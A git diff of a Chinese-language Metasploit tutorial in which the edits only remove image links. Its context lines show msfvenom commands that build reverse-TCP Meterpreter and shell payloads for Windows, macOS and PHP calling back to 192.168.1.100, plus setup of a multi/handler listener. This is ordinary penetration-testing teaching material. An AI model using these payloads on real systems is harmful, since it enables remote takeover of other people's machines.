@@ -53,9 +53,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f ex
 ```
 *   只需将平台和输出格式改为Windows对应的`windows`和`exe`即可。
 
-![](img/4564a6d313a8eb619712bd3099ca2beb_6.png)
 
-![](img/4564a6d313a8eb619712bd3099ca2beb_8.png)
 
 ![](img/4564a6d313a8eb619712bd3099ca2beb_10.png)
 
@@ -72,7 +70,6 @@ msfvenom -p osx/x86/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f macho > 
 
 ![](img/4564a6d313a8eb619712bd3099ca2beb_12.png)
 
-![](img/4564a6d313a8eb619712bd3099ca2beb_14.png)
 
 **生成PHP反向TCP Meterpreter Payload**
 ```bash
@@ -85,11 +82,9 @@ msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.100 LPORT=5555 -f raw > 
 
 ![](img/4564a6d313a8eb619712bd3099ca2beb_18.png)
 
-![](img/4564a6d313a8eb619712bd3099ca2beb_19.png)
 
 生成Payload后，需要**在攻击机上开启监听**来接收连接。这里使用Metasploit的`multi/handler`模块。
 
-![](img/4564a6d313a8eb619712bd3099ca2beb_21.png)
 
 ![](img/4564a6d313a8eb619712bd3099ca2beb_23.png)
 
@@ -105,7 +100,6 @@ run
 *   `set PAYLOAD`: 必须与生成Payload时使用的类型**完全一致**。
 *   `set LHOST`和`set LPORT`: 与生成Payload时设置的保持一致。
 
-![](img/4564a6d313a8eb619712bd3099ca2beb_25.png)
 
 ![](img/4564a6d313a8eb619712bd3099ca2beb_27.png)
 
